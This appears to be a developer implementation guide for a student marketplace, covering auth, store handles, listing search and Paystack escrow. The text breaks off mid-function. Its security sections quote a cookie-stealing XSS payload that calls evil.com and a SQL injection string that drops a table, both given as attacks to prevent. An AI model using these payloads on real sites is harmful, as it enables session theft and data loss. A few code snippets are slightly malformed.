Core Implementation Logic

Step 1 — Supabase Signup & User Record Sync

Supabase manages identity (email/password, Google OAuth). Your Prisma users table manages application data (role, verification status, wallet). These two records must stay in sync. The sync happens via a server-side POST /api/v1/auth/sync call made immediately after the Supabase SIGNED_IN event for new users.

// apps/web/app/(auth)/auth/callback/route.ts
// This Next.js Route Handler fires after Supabase's OAuth or email confirmation redirect.
// Its job: exchange the auth code for a session, then ensure a DB user record exists.
import { createClient } from '@/lib/supabase/server'
import { NextResponse } from 'next/server'
import { apiFetch } from '@/lib/api'

export async function GET(request: Request) {
  const { searchParams, origin } = new URL(request.url)
  const code = searchParams.get('code')
  const next = searchParams.get('next') ?? '/'

  if (code) {
    const supabase = createClient()
    // Exchange the one-time code for a persistent session cookie
    const { data, error } = await supabase.auth.exchangeCodeForSession(code)
    if (!error && data.session) {
      // Upsert the user row in Postgres — idempotent, safe to call multiple times
      await apiFetch('/auth/sync', {
        method: 'POST',
        // apiFetch automatically attaches the Bearer token from the session
      }, data.session.access_token)
    }
  }
  return NextResponse.redirect(`${origin}${next}`)
}
// apps/api/src/services/auth.service.ts
// syncUser() is idempotent. It creates the DB user if they don't exist,
// or returns the existing record if they do. Safe to call on every login.

export async function syncUser(supabaseUser: SupabaseUser) {
  // Extract role from metadata if user selected it during OAuth signup
  const requestedRole = supabaseUser.user_metadata?.role ?? 'BUYER'

  const user = await prisma.user.upsert({
    where: { supabaseId: supabaseUser.id },
    create: {
      supabaseId: supabaseUser.id,
      email:      supabaseUser.email!,
      name:       supabaseUser.user_metadata?.full_name,
      role:       validateRole(requestedRole),
      // Create wallet at the same time — every user gets one from the start
      wallet: { create: { availableBalance: 0, totalEarned: 0 } },
    },
    update: { email: supabaseUser.email! }, // Keep email in sync if user changes it in Supabase
    include: { store: true, wallet: true }
  })

  // Trigger student email auto-detection on every sync
  if (isUniversityEmail(supabaseUser.email!) && user.verificationStatus === 'UNVERIFIED') {
    await autoVerifyStudentEmail(user.id, supabaseUser.email!)
  }
  return user
}

Step 2 — Student Email Auto-Verification

Maintain a curated allowlist of Ghanaian university email domains. Keep this in a config file versioned with the codebase, not in the database — it changes rarely and benefits from code review. Auto-verification happens synchronously during syncUser; it requires zero admin interaction.

// apps/api/src/config/university-domains.ts
// Add new universities here as a PR. Each entry is reviewed before merging.
export const UNIVERSITY_DOMAINS = new Set([
  'ug.edu.gh',       // University of Ghana, Legon
  'st.ug.edu.gh',    // UG student subdomain
  'knust.edu.gh',    // Kwame Nkrumah University of Science & Technology
  'stu.knust.edu.gh',
  'ucc.edu.gh',      // University of Cape Coast
  'gimpa.edu.gh',    // Ghana Institute of Management and Public Administration
  'uhas.edu.gh',     // University of Health and Allied Sciences
  'uds.edu.gh',      // University for Development Studies
  'ashesi.edu.gh',   // Ashesi University
  'pentvars.edu.gh', // Pentecost University
])

export function isUniversityEmail(email: string): boolean {
  const domain = email.split('@')[1]?.toLowerCase()
  return domain ? UNIVERSITY_DOMAINS.has(domain) : false
}

async function autoVerifyStudentEmail(userId: string, email: string) {
  await prisma.user.update({
    where: { id: userId },
    data: {
      verificationStatus: 'VERIFIED',
      studentEmail:       email,
      verifiedAt:         new Date(),
      verifiedBy:         'SYSTEM_EMAIL_DOMAIN',
    }
  })
  logger.info({ userId, email, method: 'email_domain' }, 'Student auto-verified via email domain')
}

Step 3 — Student ID Upload (Fallback Verification)

For students whose university isn't in the allowlist, or who use a personal email. The upload goes directly from the browser to Supabase Storage (bypassing Express for file transfer), then Express is notified with just the file path to update the user record and queue admin review.

// Frontend — Client Component: apps/web/components/verification/IDUploadForm.tsx
// Pattern: upload to Supabase Storage directly from browser,
// then tell Express the path. Express NEVER handles the raw file bytes.

async function handleUpload(file: File) {
  const supabase = createBrowserClient(...)

  // 1. Upload to private bucket — path is deterministic per user
  const filePath = `student-ids/${userId}/front-${Date.now()}.webp`
  const { error } = await supabase.storage
    .from('verification-docs')    // Private bucket — no public read
    .upload(filePath, file, { upsert: true })
  if (error) throw new Error('Upload failed')

  // 2. Notify Express — send only the path, not the file
  await apiFetch('/users/verify-student', {
    method: 'POST',
    body: JSON.stringify({ idImagePath: filePath })
  })
}

// Backend — Express handler updates DB and queues admin notification
async function submitStudentId(userId: string, idImagePath: string) {
  // Validate the path belongs to this user — prevents path injection
  const expectedPrefix = `student-ids/${userId}/`
  if (!idImagePath.startsWith(expectedPrefix))
    throw new ForbiddenError('Invalid file path')

  await prisma.user.update({
    where: { id: userId },
    data: { verificationStatus: 'PENDING', studentIdImagePath: idImagePath }
  })
  // Queue a notification to the admin review queue
  await notificationQueue.add('admin-review-needed', { userId, type: 'student-id' })
}
Pillar 2

Performance & Optimization

Auth is in the hot path of every page load. Performance failures here manifest as frustrating full-page loading spinners.

  • Session reads are edge-fast. The Supabase @supabase/ssr library reads the session from a cookie — this is a synchronous memory read in Next.js middleware. No network round-trip to Supabase occurs on every request. The middleware only makes a network call when the access token has expired and needs to be refreshed from the refresh token.
  • Cache the DB user lookup in Redis. The Express authenticate middleware calls prisma.user.findUnique({ supabaseId }) on every authenticated request. This query hits the database every time. Cache the result in Redis with key user:supa:{supabaseId} and TTL of 5 minutes. Invalidate the cache key whenever the user's role or verification status changes.
  • The /auth/me endpoint uses Next.js fetch caching. Dashboard layouts call /api/v1/auth/me to get the user's full profile. Tag this fetch with next: { tags: ['user-me'] }. Call revalidateTag('user-me') after any user update. This prevents redundant profile fetches across RSC re-renders on the same request.
  • Image compression before upload. Use the browser's canvas API to compress student ID photos to JPEG at 85% quality, max 1200px wide, before uploading. This reduces upload time from ~8s on 3G to ~1.5s without visibly degrading legibility for admin reviewers.
Pillar 3

Security & Error Handling

Auth Rate Limiting — Critical

Apply 10 requests per IP per minute on all /auth/* routes. This prevents brute-force password attacks and credential stuffing. Use Upstash Redis sliding window. Separate limits: 3 failed login attempts per IP per 15 minutes trigger a temporary lockout and an email alert to the account owner. Implement this as a BullMQ delayed job, not a simple setTimeout — server restarts must not reset the lockout timer.

  • Email enumeration prevention. On "Forgot Password", always return 200 OK with the message "If an account exists, you'll receive an email." Never return 404 Not Found for non-existent emails — this lets attackers enumerate your user list.
  • Student ID path validation. When Express receives a studentIdImagePath, validate that it starts with student-ids/{userId}/ — the authenticated user's own prefix. A malicious user could submit a path like student-ids/admin123/id.webp to overwrite another user's verification document.
  • Role escalation prevention. The /auth/sync endpoint ignores any role value in the request body — the role is only set from supabaseUser.user_metadata which is controlled server-side. A user cannot POST { "role": "ADMIN" } to elevate themselves.
  • ADMIN role is never self-assigned. Admin users are created directly in the database by a privileged migration script. The application code has no code path that sets role = 'ADMIN' based on user input. Any attempt is silently ignored by the Zod schema validation layer.
  • Graceful degradation. If Supabase Auth is down during the Express authenticate middleware call, catch the network error and return 503 Service Unavailable with Retry-After: 30. Never return 401 Unauthorized — that implies the token is invalid, not that the verification service is down. These are semantically different from the client's perspective.

Pillar 5

Edge Cases & Missed Scenarios

Duplicate signup via OAuth + email

A user signs up with their Google account (which is their .edu.gh email), then later tries to sign up with email/password using the same address. Supabase handles this by linking accounts, but your syncUser upsert must be idempotent and not create duplicate rows.
The upsert on supabaseId handles this at the DB level. But also: Supabase itself will prevent duplicate signups for the same email address and return an error that you must surface gracefully: "An account with this email already exists. Try signing in instead."

Student graduates — verification expires

A student verified via email domain graduates. Their .edu.gh email still works (universities rarely revoke alumni email access), so they continue to get the 5% student fee rate indefinitely.
Add a verifiedAt + 12-month annual re-verification check. A BullMQ cron runs monthly and identifies users whose verifiedAt is 11 months ago. Send a re-verification nudge email. At 12 months: downgrade to UNVERIFIED + send email. Include an Alumni Seller path (6% rate) as a graceful transition documented in your ToS.

Admin review race condition

Two admin users open the same pending ID review in the admin panel simultaneously. Both approve it. The second approval is a no-op but could trigger duplicate notifications to the user.
The admin approval mutation uses an atomic Prisma update with a where: { id, verificationStatus: 'PENDING' } guard. The second admin's update matches 0 rows and returns a 404 response. The notification job checks the current status before sending — only sends if verificationStatus just changed to VERIFIED (compare before/after in the update result).

Webhook triggers syncUser before OAuth callback completes

Supabase can fire auth state events before the OAuth redirect callback handler completes. In a race condition, syncUser could be called before the user's metadata (name, role) is fully populated.
Make syncUser purely additive on the first call: only set name and role if they aren't already set. The update branch of the upsert only refreshes the email. A separate PATCH /api/v1/users/me endpoint allows users to complete their profile in the onboarding flow after the callback.

Step 1 — Handle Validation & Availability Check

The store handle is the most user-facing piece of infrastructure you'll build. It must be validated at multiple layers: client-side regex check (instant feedback), server-side availability check via debounced API call (300ms), and database-level unique constraint (final safety net). Never rely on only one layer.

// apps/api/src/services/store.service.ts

// Blocklist of reserved handles. Expand this carefully — every reserved word
// is a handle that can never be claimed, even if you want to sell it later.
const RESERVED_HANDLES = new Set([
  'admin', 'api', 'auth', 'checkout', 'dashboard', 'help',
  'login', 'logout', 'search', 'settings', 'store', 'stores',
  'support', 'terms', 'privacy', 'about', 'pricing',
  'ushop', 'u-shop', 'uShop', 'www', 'mail', 'blog',
])

export const HANDLE_REGEX = /^[a-z0-9][a-z0-9-]{1,30}[a-z0-9]$/

export async function checkHandleAvailability(handle: string) {
  // Layer 1: Format check
  if (!HANDLE_REGEX.test(handle))
    return { available: false, reason: 'Invalid format' }

  // Layer 2: Blocklist check
  if (RESERVED_HANDLES.has(handle.toLowerCase()))
    return { available: false, reason: 'Reserved' }

  // Layer 3: Database uniqueness check
  // Also check previousHandle — a seller who changed their handle from "kwame-tech"
  // to "kwame-electronics" has freed up "kwame-tech" for others (after 90 days).
  const existing = await prisma.store.findFirst({
    where: { OR: [{ handle }, { previousHandle: handle }] },
    select: { id: true }
  })
  return { available: !existing }
}

Step 2 — Store Creation with Atomic Policy Init

// apps/api/src/services/store.service.ts
export async function createStore(ownerId: string, dto: CreateStoreDto) {
  // Idempotency: a user can only have one store
  const existing = await prisma.store.findUnique({ where: { ownerId } })
  if (existing) throw new ConflictError('You already have a store')

  // Re-validate handle inside the service — controller already validated,
  // but services should never trust their callers blindly
  const { available } = await checkHandleAvailability(dto.handle)
  if (!available) throw new ConflictError('This store URL is taken')

  // Default return policy — every store starts with the platform minimum.
  // Sellers can customize this, but this is always the starting point.
  const defaultPolicy = {
    returnWindow:       'NO_RETURNS',
    returnCondition:    'SAME_CONDITION',
    returnShipping:     'BUYER_PAYS',
    warrantyPeriod:     'NONE',
    warrantyCoverage:   'DOA_ONLY',
    refundMethod:       'PLATFORM_WALLET',
    policyNotes:        '',
    policyVersion:      1,    // Increment on every update for audit trail
    lastUpdated:        new Date().toISOString(),
  }

  const store = await prisma.store.create({
    data: {
      handle:       dto.handle,
      name:         dto.name,
      bio:          dto.bio?.slice(0, 280),  // Enforce DB-level char limit in app layer too
      returnPolicy: defaultPolicy,
      ownerId,
    }
  })

  // Update the owner's role to include SELLER if they were BUYER-only
  await prisma.user.update({
    where: { id: ownerId },
    data:  { role: 'BOTH' }   // Now they are both a buyer and a seller
  })

  // Trigger OG image generation job (async — doesn't block response)
  await ogImageQueue.add('generate', { storeId: store.id, handle: store.handle })

  return store
}

Pillar 2

Performance & Optimization

  • ISR (Incremental Static Regeneration) for store pages. Use revalidate: 60 on the fetchStore call. Vercel will statically render and cache the page for 60 seconds. After 60 seconds, the first request triggers background re-generation while still serving the stale page. This gives static-page performance with near-real-time freshness.
  • On-demand revalidation on store update. When a seller updates their store name, bio, or policy, call revalidatePath('/store/janes-tech') from a Server Action. This immediately invalidates the ISR cache. The next visitor gets the fresh version, not the 60-second stale version.
  • Handle availability check is debounced + Redis-cached. The frontend debounces the API call to 300ms on input. The Express handler checks a Redis cache first (handle:available:{slug}, TTL: 30 seconds) before hitting the database. This prevents a database query on every keystroke even if the debounce fails.
  • OG image generation is lazy and cached. The OG image route handler (/api/og/store/[handle]) generates the preview image using @vercel/og with the Edge Runtime on first hit, then Vercel caches it at the CDN layer for 24 hours. The seller's logo and name are embedded in the image at generation time. Cache-Control: s-maxage=86400, stale-while-revalidate=3600.
Pillar 3

Security & Error Handling

XSS Prevention in Custom Store Policies

The policy policyNotes field is free text (max 500 chars) that gets displayed on every listing and at checkout. If rendered as raw HTML, a seller could inject <script>document.location='evil.com?c='+document.cookie</script> and steal every buyer's session token who views their listings. Mitigation: always render policyNotes with React's default text rendering (via {policy.policyNotes} not dangerouslySetInnerHTML). React escapes HTML entities by default. Additionally, sanitize the input on the backend with DOMPurify (server-side via isomorphic-dompurify) before persisting, stripping all HTML tags to plain text. Never display rich HTML from user-supplied store policy text.

  • Policy field enumeration — never accept free-text for structured fields. The returnWindow, warrantyPeriod, and other policy enum fields are validated against a Zod enum schema on the backend. A Zod z.enum(['NO_RETURNS', '24H', '3D', '7D', '14D', '30D']) will throw a 400 error for any value not in the list, preventing injection via these fields.
  • Policy snapshot immutability. At order creation, the store's returnPolicy JSON is deep-copied and stored on the Order.policySnapshot field. This happens inside the Prisma transaction. Even if the seller updates their policy 5 minutes later, the order record already has the immutable version the buyer agreed to. The dispute system always reads order.policySnapshot, never store.returnPolicy.
  • Store deactivation (soft delete). Never hard-delete a store. Set store.isActive = false. All historical orders still reference the store, and buyers need to see seller information for past transactions. The public store page returns a 404 for inactive stores, but admin can still access them. Hard deleting would break relational integrity of the orders table.

Pillar 5

Edge Cases & Missed Scenarios

Two sellers claim the same handle simultaneously

Seller A and Seller B both check handle "kwame-tech" at the same time. Both get "available". Both submit the create form. Who wins?
The database unique constraint on stores.handle is the final arbiter. The second insert throws a Prisma P2002 unique constraint violation. Catch this specific error code in the controller and return 409 Conflict with the message "This URL was just taken. Please choose another." Do NOT rely on the application-layer availability check alone.

Policy change with orders in transit

A seller updates their return policy from "7 Days" to "No Returns" while three orders are in transit. Buyers of those orders were shown the 7-day policy at checkout.
Policy changes are always forward-only. The order.policySnapshot field contains the immutable policy snapshot for each existing order. In-transit order buyers always get their checkout-time policy. The updated policy only applies to new orders created after the policy change. No action needed beyond the snapshot mechanism.

Seller with active orders tries to delete store

A seller wants to close their store, but they have 3 orders in PAYMENT_RECEIVED or PROCESSING status. Hard-deleting the store would cascade-delete listings and break order history.
Block store deactivation if orders.count({ storeId, status: { in: ['PAYMENT_RECEIVED', 'PROCESSING', 'IN_TRANSIT', 'DISPUTED'] } }) > 0. Return a 409 with a clear message listing the active order count. Once all orders reach a terminal state (COMPLETED, REFUNDED, CANCELLED), allow deactivation. Set isActive = false — never DELETE.

Handle SEO continuity after change

A seller changes their handle from "kwame-tech" to "kwame-electronics". Google has indexed hundreds of pages at the old URL. Without a redirect, all that SEO value evaporates and existing social media links break.
Store the old handle in previousHandle on the Store record. The store page Server Component checks if params.handle === store.previousHandle and calls Next.js redirect() with RedirectType.permanent (HTTP 301). Vercel caches this 301 at the edge. Handle changes are limited to once — prevent perpetual redirect chains.

// apps/api/src/services/listing.service.ts

// Condition requirements — each grade has minimum photo requirements.
// This enforces the PRD requirement that reduces the "condition grade war."
const CONDITION_REQUIREMENTS: Record<string, { minPhotos: number; requiresBatteryShot: boolean }> = {
  NEW:           { minPhotos: 2, requiresBatteryShot: false },
  LIKE_NEW:      { minPhotos: 3, requiresBatteryShot: false },
  USED_EXCELLENT:{ minPhotos: 4, requiresBatteryShot: false },
  USED_GOOD:     { minPhotos: 4, requiresBatteryShot: true  }, // Phones & laptops
  USED_FAIR:     { minPhotos: 5, requiresBatteryShot: true  },
  FOR_PARTS:     { minPhotos: 3, requiresBatteryShot: false },
}

const BATTERY_CATEGORIES = new Set(['phones', 'laptops', 'tablets'])

export async function createListing(sellerId: string, dto: CreateListingDto) {
  const store = await prisma.store.findUnique({ where: { ownerId: sellerId } })
  if (!store) throw new ForbiddenError('Create a store before listing items')

  const reqs = CONDITION_REQUIREMENTS[dto.condition]
  if (dto.imagePaths.length < reqs.minPhotos)
    throw new ValidationError(`${dto.condition} requires at least ${reqs.minPhotos} photos`)

  const isBatteryCategory = BATTERY_CATEGORIES.has(dto.categorySlug)
  if (reqs.requiresBatteryShot && isBatteryCategory && !dto.hasBatteryScreenshot)
    throw new ValidationError('Battery health screenshot is required for this condition grade')

  // New seller stock limit — PRD safety feature to limit fraud from new sellers
  const totalSales = await prisma.order.count({ where: { storeId: store.id, status: 'COMPLETED' } })
  if (totalSales === 0) {  // Brand new seller with no completed sales
    const activeListings = await prisma.listing.count({
      where: { storeId: store.id, status: { in: ['ACTIVE', 'DRAFT'] } }
    })
    if (activeListings >= 3)
      throw new ForbiddenError('New sellers are limited to 3 listings until their first sale completes')
  }

  return prisma.listing.create({ data: { ...
    storeId:       store.id,
    policySnapshot: store.returnPolicy,  // Snapshot at listing creation too
    status:        dto.isDraft ? 'DRAFT' : 'ACTIVE',
  }})
}

Step 2 — Full-Text Search with Prisma Raw Query

Prisma's findMany doesn't support PostgreSQL's @@ full-text search operator natively. Use prisma.$queryRaw for search, but use regular Prisma queries for everything else. The search_vector tsvector column is maintained by a database trigger (defined in the architecture blueprint).

// apps/api/src/services/listing.service.ts

export async function searchListings(params: SearchParams) {
  const {
    query,         // Search term from user
    category,      // Optional category slug filter
    minPrice,      // Optional price range filter
    maxPrice,
    condition,     // Optional condition grade filter
    sellerType,    // 'student' | 'reseller' | undefined
    cursor,        // Cursor for pagination (last item's id from previous page)
    limit = 20,    // Max 50 items per page
    sortBy = 'newest',
  } = params

  // SECURITY: Use Prisma.sql tagged template for parameterized queries.
  // NEVER string-interpolate user input directly into SQL.
  // Prisma.sql prevents SQL injection by parameterizing all values.
  const tsQuery = query
    ? Prisma.sql`AND l.search_vector @@ plainto_tsquery('english', ${query})`
    : Prisma.sql``  // No search — return all (filtered by other params)

  const categoryFilter = category
    ? Prisma.sql`AND c.slug = ${category}`
    : Prisma.sql``

  const priceFilter = Prisma.sql`
    ${minPrice != null ? Prisma.sql`AND l.price >= ${minPrice}` : Prisma.sql``}
    ${maxPrice != null ? Prisma.sql`AND l.price <= ${maxPrice}` : Prisma.sql``}
  `

  const conditionFilter = condition
    ? Prisma.sql`AND l.condition = ${condition}::"ConditionGrade"`
    : Prisma.sql``

  const sellerFilter = sellerType === 'student'
    ? Prisma.sql`AND u.verification_status = 'VERIFIED'`
    : sellerType === 'reseller'
    ? Prisma.sql`AND u.verification_status != 'VERIFIED'`
    : Prisma.sql``

  // Cursor-based pagination: more efficient than OFFSET at scale.
  // OFFSET=10000 forces PG to scan and discard 10,000 rows. Cursor does not.
  const cursorFilter = cursor
    ? Prisma.sql`AND l.id < ${cursor}`  // Assumes newest-first; adjust for other sorts
    : Prisma.sql``

  const orderClause = sortBy === 'price_asc'  ? Prisma.sql`ORDER BY l.price ASC`
                      : sortBy === 'price_desc' ? Prisma.sql`ORDER BY l.price DESC`
                      : sortBy === 'rating'     ? Prisma.sql`ORDER BY avg_rating DESC NULLS LAST`
                      :                               Prisma.sql`ORDER BY l.created_at DESC`

  const safeLimit = Math.min(limit, 50)  // Cap at 50 regardless of what client sends

  const results = await prisma.$queryRaw<ListingSearchResult[]>Prisma.sql`
    SELECT
      l.id, l.title, l.price, l.condition, l.image_paths[1] AS primary_image,
      s.handle AS store_handle, s.name AS store_name,
      u.verification_status, l.created_at,
      -- Rank by relevance when query is provided
      ${query ? Prisma.sql`ts_rank(l.search_vector, plainto_tsquery('english', ${query})) AS rank` : Prisma.sql`1 AS rank`}
    FROM listings l
    JOIN stores s ON l.store_id = s.id
    JOIN users u ON s.owner_id = u.id
    JOIN categories c ON l.category_id = c.id
    WHERE l.status = 'ACTIVE'
    ${tsQuery} ${categoryFilter} ${priceFilter} ${conditionFilter} ${sellerFilter} ${cursorFilter}
    ${orderClause}
    LIMIT ${safeLimit + 1}  -- Fetch N+1 to determine if there's a next page
  `

  const hasNextPage = results.length > safeLimit
  const items = hasNextPage ? results.slice(0, safeLimit) : results
  return {
    data:       items,
    nextCursor: hasNextPage ? items.at(-1)?.id : null,
    hasNextPage,
  }
}
Pillar 2

Performance & Optimization

  • GIN index on search_vector — non-negotiable. Without this index, every full-text search is a sequential scan of the entire listings table. With it, PostgreSQL jumps directly to matching rows. At 10,000 listings this is the difference between 2000ms and 8ms response times. Run the GIN index SQL from the architecture blueprint before any performance testing.
  • Composite indexes for filter combinations. The most common query is WHERE status = 'ACTIVE' AND category_id = ? AND price BETWEEN ? AND ?. Create CREATE INDEX idx_listings_active_cat_price ON listings(status, category_id, price) WHERE status = 'ACTIVE'. The partial index (WHERE status = 'ACTIVE') only indexes active listings, making it much smaller and faster.
  • Redis cache for search results. Cache the first page of popular searches (no filters, top categories) in Redis with a 2-minute TTL. Cache key: search:{md5(queryString)}. This serves the majority of browsing traffic (home page, category pages, common searches) from memory. Only cache first-page results — paginated results are unique to user session and not worth caching.
  • Lazy loading with React Suspense for infinite scroll. The listing grid uses React Suspense with a <Suspense fallback={<SkeletonGrid />}> boundary. The initial 20 listings are server-rendered. "Load more" triggers a client-side fetch using the cursor from the previous response. This avoids shipping all listings to the browser at once.
  • Image CDN transforms. Listing photos stored in Supabase Storage are served through a transformation URL: supabase.storage.from('product-images').getPublicUrl(path, { transform: { width: 400, quality: 80 } }). The listing card displays a 400px thumbnail. The lightbox requests the original. Never serve 3000×4000px source images to a 400px card.
Pillar 3

Security & Error Handling

SQL Injection Prevention in Search

The search query is user-supplied text that goes directly into a PostgreSQL full-text search function. Never do this: prisma.$queryRawUnsafe(`... plainto_tsquery('english', '${query}')`) — a user could input '; DROP TABLE listings; --. Always use Prisma.sql tagged template literals for $queryRaw calls. Prisma's tagged template automatically parameterizes all values, which PostgreSQL treats as data — not executable SQL. This is the only safe way to use $queryRaw.

  • Payload size limiting on list endpoints. The limit query parameter is capped at 50 in the Zod schema (z.coerce.number().int().min(1).max(50).default(20)). Even if a client sends ?limit=10000, they get at most 50 items. This prevents a single query from returning megabytes of JSON that crashes the frontend or exhausts the database connection.
  • Image path ownership validation. When creating a listing, validate that each path in imagePaths starts with the expected bucket prefix. A seller should not be able to reference another seller's product photos by submitting arbitrary Supabase Storage paths.
  • Graceful search degradation. If the PostgreSQL full-text search index is being rebuilt (rare but possible after large imports), the @@ operator still works but is slow. Wrap the search query in a Redis circuit breaker: if 3 search requests take > 5 seconds in a 60-second window, switch to a simpler ILIKE query and log a WARN. Users get slower but functional search instead of timeouts.

Pillar 5

Edge Cases & Missed Scenarios

Listing sold mid-search results page

A buyer is browsing search results. A listing appears on page 1. By the time they click it, another buyer has purchased the last unit and the listing is now SOLD. The buyer sees the listing detail but cannot buy it.
The listing detail page always does a fresh server-side fetch (no ISR — listings change too frequently). If listing.stock === 0 or listing.status !== 'ACTIVE', the Buy button is disabled with "Just sold — check back later." Show the seller's other active listings as alternatives. Never cache listing detail pages for more than 5 seconds.

Search returns ghost listings (status changed)

Search results are cached in Redis for 2 minutes. During that window, a seller pauses or deletes a listing. The cached results still include it. A buyer clicks it and gets a 404.
The listing detail page handles 404 gracefully with a "This listing is no longer available" page and a link back to search. More importantly: when a listing status changes to SOLD/PAUSED/DRAFT, call invalidateSearchCache() which deletes all search cache keys containing that category slug. The 2-minute Redis TTL is the acceptable staleness window for search results.

Cursor invalidation after seller re-orders listings

A buyer is paginating through results. On page 3, the cursor points to listing ID "abc". Meanwhile, the seller updates their listing (changing price, description). The updated listing now has a new updated_at timestamp. If sorting by "newest update", the cursor-based pagination breaks — the listing is in a different position now.
Always cursor on the id field (which never changes), not on updated_at or price. Sort is applied as a secondary-only criterion. The SQL ordering is: ORDER BY created_at DESC, id DESC — the ID tie-breaker ensures stable cursor positioning regardless of other field changes.

Search query too long / adversarial input

A bot sends a search query 10,000 characters long. plainto_tsquery('english', [10k chars]) could be slow and expensive for the database.
Zod schema on the search route: query: z.string().max(200).optional(). Any query longer than 200 characters returns a 400 error immediately without hitting the database. The rate limiter (60 requests/minute for search) further limits bot abuse. Log any attempts at queries > 200 chars as WARN with the IP address.

Step 1 — Checkout Initiation (Order → Paystack)

Escrow Rule R-01 from the Escrow Tech Spec

Escrow is created only after a verified charge.success webhook — never on the redirect callback alone. The redirect callback's only job is to show the user a "processing" screen and poll for order status. Escrow state is set exclusively by the webhook handler. A buyer who manually hits the callback URL without paying must never get their order processed.

// apps/api/src/services/order.service.ts
// The full initiateOrder flow with all production-ready guards

export async function initiateOrder(dto: InitiateOrderDto) {
  // ── GUARD 1: Fetch listing with full relational context ──────────
  const listing = await prisma.listing.findUniqueOrThrow({
    where: { id: dto.listingId, status: 'ACTIVE' },
    include: { store: { include: { owner: true } } }
  })

  // ── GUARD 2: Business rule violations ───────────────────────────
  if (listing.store.ownerId === dto.buyerId)
    throw new ForbiddenError('You cannot purchase your own listing')
  if (listing.stock < dto.quantity)
    throw new BadRequestError('Insufficient stock')
  if (!listing.store.owner.paystackRecipientCode)
    throw new BadRequestError('This seller has not set up payment details yet')

  // ── Fee calculation ──────────────────────────────────────────────
  const isStudent   = listing.store.owner.verificationStatus === 'VERIFIED'
  const feeRate    = new Decimal(isStudent ? '0.05' : '0.08')
  const unitPrice  = new Decimal(listing.price)
  const total      = unitPrice.mul(dto.quantity)
  const fee        = total.mul(feeRate).toDecimalPlaces(2, Decimal.ROUND_UP)
  const sellerAmt  = total.minus(fee)

  // ── Generate reference before DB write ──────────────────────────
  // The reference is our internal ID for linking the Paystack tx to an order.
  // Format is human-readable for support tickets and Paystack dashboard.
  const paystackRef = `ushop_${Date.now()}_${crypto.randomUUID().slice(0,8)}`

  // ── Atomic DB write ──────────────────────────────────────────────
  // Both the order creation AND the stock reservation happen in one transaction.
  // If either fails, neither happens. No orphan orders, no over-sold stock.
  const order = await prisma.$transaction(async (tx) => {
    const newOrder = await tx.order.create({ data: {
      buyerId: dto.buyerId, storeId: listing.storeId,
      totalAmount: total, platformFee: fee, sellerAmount: sellerAmt,
      paystackRef,
      shippingAddress: dto.shippingAddress,
      policySnapshot:  listing.store.returnPolicy,  // R-10: immutable at checkout
      status: 'PENDING_PAYMENT',
      items: { create: { listingId: dto.listingId, quantity: dto.quantity, unitPrice: unitPrice } }
    }})
    // Decrement stock atomically — prevents overselling under concurrent load
    await tx.listing.update({
      where: { id: dto.listingId, stock: { gte: dto.quantity } },  // Guard in WHERE clause
      data:  { stock: { decrement: dto.quantity } }
    })
    return newOrder
  })

  // ── Call Paystack AFTER DB write (cannot roll back Paystack) ─────
  const buyer = await prisma.user.findUniqueOrThrow({ where: { id: dto.buyerId } })
  const payment = await PaystackService.initializeTransaction({
    email:        buyer.email,
    amount:       toPesewas(total),  // Paystack uses smallest denomination
    reference:    paystackRef,
    callback_url: `${process.env.FRONTEND_URL}/checkout/complete?orderId=${order.id}`,
    channels:     ['card', 'mobile_money', 'bank'],
    metadata:     { orderId: order.id, sellerId: listing.store.ownerId }
  })

  return { orderId: order.id, authorizationUrl: payment.authorization_url }
}

// apps/api/src/services/webhook.service.ts
// handleChargeSuccess implements Escrow Rules R-01, R-02, R-08, R-14

export async function handleChargeSuccess(data: PaystackChargeData) {
  // Find order by the Paystack reference — this is the link between our DB and Paystack
  const order = await prisma.order.findUnique({ where: { paystackRef: data.reference } })
  if (!order) {
    logger.warn({ ref: data.reference }, 'charge.success for unknown reference — possible data corruption')
    return
  }
  // Idempotency: already processed this payment (webhook retry)
  if (order.status !== 'PENDING_PAYMENT') {
    logger.info({ orderId: order.id }, 'charge.success duplicate — already processed')
    return
  }

  // R-02: escrow_release_at is 7 days from paidAt, not from order creation
  const paidAt           = new Date()
  const escrowReleaseAt  = new Date(paidAt.getTime() + 7 * 24 * 60 * 60 * 1000)

  // R-08: wallet credit and escrow creation are atomic
  // Both succeed together or both fail together — no split state
  await prisma.$transaction([
    prisma.order.update({
      where: { id: order.id },
      data:  { status: 'PAYMENT_RECEIVED', paidAt, escrowReleaseAt }
    }),
    prisma.escrow.create({
      data: {
        orderId:    order.id,
        heldAmount: order.sellerAmount,  // Only the seller's cut — not the platform fee
        status:     'HELD',
      }
    }),
    // Auto-mark listing as SOLD if stock hits 0
    prisma.listing.updateMany({
      where: { id: order.items[0].listingId, stock: 0 },
      data:  { status: 'SOLD' }
    }),
  ])

  // Schedule reminder sequence (BullMQ delayed jobs — survives server restarts)
  await scheduleEscrowReminders(order.id, escrowReleaseAt)
  // Notify seller
  await emailQueue.add('seller-new-order', { orderId: order.id, storeId: order.storeId })
  logger.info({ orderId: order.id, amount: order.totalAmount }, 'Payment received — escrow created')
}

Step 3 — Escrow Release (Buyer Confirmation or Auto-Release)

// apps/api/src/services/escrow.service.ts
// This is the single code path for ALL escrow releases.
// Whether buyer clicked "Confirm Delivery" or the 7-day cron fired,
// they both call this function. This ensures rule consistency.

export async function releaseEscrow(
  orderId: string,
  trigger: 'BUYER_CONFIRMED' | 'AUTO_7DAY' | 'ADMIN_RELEASE',
  actorId?: string  // buyerId for BUYER_CONFIRMED, adminId for ADMIN_RELEASE
) {
  // R-04: Only the buyer of this specific order can trigger buyer-confirmation
  if (trigger === 'BUYER_CONFIRMED') {
    const order = await prisma.order.findUniqueOrThrow({ where: { id: orderId } })
    if (order.buyerId !== actorId) throw new ForbiddenError('Only the buyer can confirm delivery')
    if (order.status === 'DISPUTED') throw new BadRequestError('Cannot confirm while a dispute is open')
  }

  // R-03: Atomic update — WHERE status = 'HELD' prevents double-release
  // If two concurrent requests both try to release, only one will match this WHERE clause.
  // The second will update 0 rows, which we detect and handle gracefully.
  const updateResult = await prisma.$transaction(async (tx) => {
    // Attempt to claim the escrow atomically
    const escrow = await tx.escrow.updateMany({
      where:  { orderId, status: 'HELD' },  // R-03: only if currently HELD
      data:   { status: 'RELEASED', releasedAt: new Date(), releaseTrigger: trigger }
    })
    if (escrow.count === 0) throw new Error('ALREADY_RELEASED')  // Will roll back tx

    const order = await tx.order.findUniqueOrThrow({
      where: { id: orderId }, include: { store: true }
    })

    // R-08: Credit wallet in the same transaction as escrow status update
    await tx.wallet.update({
      where: { userId: order.store.ownerId },
